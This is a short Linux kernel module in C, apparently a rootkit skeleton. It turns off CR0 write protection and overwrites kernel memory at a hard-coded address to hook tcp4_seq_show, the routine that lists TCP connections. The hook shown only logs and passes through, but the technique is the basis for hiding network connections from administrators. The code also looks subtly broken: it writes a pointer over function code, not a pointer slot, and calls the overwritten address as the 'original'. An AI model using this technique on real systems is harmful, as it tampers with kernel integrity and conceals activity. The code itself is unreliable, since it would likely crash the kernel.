#include <linux/module.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <stdbool.h>

// Types & other consts.
typedef int (*original_tcp4_seq_show_t)(struct seq_file *seq, void *v);
static original_tcp4_seq_show_t original_tcp4_seq_ptr;
static unsigned long *tcp4_seq_show_address = (unsigned long *)0xffffffff82d2c290; 
 
static inline void wp_cr0(unsigned long val) {
    __asm__ __volatile__ ("mov %0, %%cr0": "+r" (val));
}

static inline void zero_cr0(void) {
    printk(KERN_ALERT "Unprotecting mem!");
    wp_cr0(read_cr0() & (~0x10000));
}

static inline void one_cr0(void) {
    printk(KERN_ALERT "Protecting mem...");
    wp_cr0(read_cr0() | 0x10000);
}

int tcp4_seq_show(struct seq_file *seq, void *v) {
    printk(KERN_ALERT "HOOKED");
    return original_tcp4_seq_ptr(seq, v);
}

 
int load(void) {
    printk(KERN_ALERT "Initializing...");
    zero_cr0();
    original_tcp4_seq_ptr = (original_tcp4_seq_show_t)tcp4_seq_show_address;
    *tcp4_seq_show_address = (long unsigned int)tcp4_seq_show;
    printk(KERN_ALERT "Overrided tcp4_seq_show!");
    one_cr0();
    printk(KERN_ALERT "Initialized successfuly!");

    return 0;
}
 
void unload(void) {
    printk(KERN_ALERT "Shutting down.");
    zero_cr0();
    *tcp4_seq_show_address = (long unsigned int)original_tcp4_seq_ptr;
    printk(KERN_ALERT "tcp4 eq show has been restored!");
    one_cr0();
    printk(KERN_ALERT "Goodbye world...");
}

module_init(load);
module_exit(unload);

MODULE_LICENSE("GPL");